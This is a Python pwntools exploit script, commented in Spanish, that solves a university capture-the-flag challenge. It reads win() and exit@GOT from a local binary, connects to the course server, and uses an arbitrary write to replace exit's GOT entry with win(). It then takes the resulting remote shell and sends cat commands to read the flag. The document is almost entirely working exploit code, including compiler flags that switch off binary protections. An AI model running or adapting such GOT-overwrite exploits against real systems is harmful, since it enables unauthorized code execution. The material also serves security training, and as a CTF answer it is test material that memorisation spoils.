#!/usr/bin/env python3
"""
Game Of Thrones - 100pts
Binary Exploitation: Arbitrary Write + GOT Overwrite

Estrategia:
1. Cargar el binario local con pwntools (ELF) para extraer:
   - Dirección de la función win()
   - Dirección de exit en la GOT
2. Conectar al servidor remoto
3. Enviar address = exit@GOT
4. Enviar value = win()
5. El programa sobrescribe exit en la GOT con win
6. Cuando exit(1) se ejecuta, salta a win() → /bin/sh
7. Interactuar con el shell para obtener la flag
"""

from pwn import *

def exploit():
    # Cargar el binario local para obtener direcciones
    print("[*] Cargando binario local...")
    try:
        # El binario se llama "reto" en ctf_argentina
        elf = ELF("reto")
        
        win_addr = elf.symbols['win']
        exit_got = elf.got['exit']
        
        log.info(f"win()     = {hex(win_addr)}")
        log.info(f"exit@GOT  = {hex(exit_got)}")
        
    except FileNotFoundError:
        print("[-] Binario 'reto' no encontrado en la carpeta actual")
        print("[*] Asegúrate de estar en ctf_argentina/")
        print("[*] O intenta compilarlo con:")
        print("    gcc reto.c -w -O0 -std=c99 -fno-pie -fno-pic \\")
        print("        -fno-stack-protector -z norelro -o reto")
        return
    except Exception as e:
        print(f"[-] Error cargando binario: {e}")
        import traceback
        traceback.print_exc()
        return
    
    # Conectar al servidor remoto
    print("\n[*] Conectando a ic.catedras.linti.unlp.edu.ar:15022...")
    p = remote("ic.catedras.linti.unlp.edu.ar", 15022)
    
    # Recibir primer prompt
    p.recvuntil(b"direccion")
    print("[+] Servidor pidiendo dirección")
    
    # Enviar dirección de exit@GOT
    print(f"[*] Enviando address = {hex(exit_got)}")
    p.sendline(hex(exit_got)[2:].encode())
    
    # Recibir segundo prompt
    p.recvuntil(b"bytes")
    print("[+] Servidor pidiendo valor")
    
    # Enviar dirección de win()
    print(f"[*] Enviando value = {hex(win_addr)}")
    p.sendline(hex(win_addr)[2:].encode())
    
    # El programa ahora hace:
    # *(unsigned int *)exit_got = win_addr;
    # puts("bye...\n");
    # exit(1);  <- Esto ahora salta a win() en lugar de exit real
    
    print("\n[+] Exploit enviado. Sobrescrita GOT(exit) -> win()")
    print("[*] Obteniendo shell remoto...")
    
    # Dar un momento para que se estabilice la conexión
    import time
    time.sleep(0.5)
    
    # Intentar obtener la flag automáticamente
    try:
        print("[*] Buscando flag...")
        
        # Intentar diferentes rutas/nombres de flag
        flag_commands = [
            b"cat /flag\n",
            b"cat flag\n",
            b"cat flag.txt\n",
            b"ls -la\n",
        ]
        
        for cmd in flag_commands:
            try:
                p.sendline(cmd)
                p.settimeout(1)
                output = p.recvline(timeout=1)
                
                if b"IC{" in output or b"UNLP{" in output or b"flag" in output.lower():
                    print(f"\n[+] FLAG ENCONTRADA:\n{output.decode(errors='replace')}\n")
                    break
                elif cmd == b"ls -la\n":
                    print(f"[*] Listado:\n{output.decode(errors='replace')}")
            except Exception as e:
                pass
        
        # Modo interactivo como fallback
        print("\n[*] Modo interactivo (escribe comandos manualmente si necesitas más info)")
        p.interactive()
        
    except Exception as e:
        print(f"[-] Error: {e}")
        print("[*] Entrando en modo interactivo manual...")
        p.interactive()

if __name__ == "__main__":
    exploit()
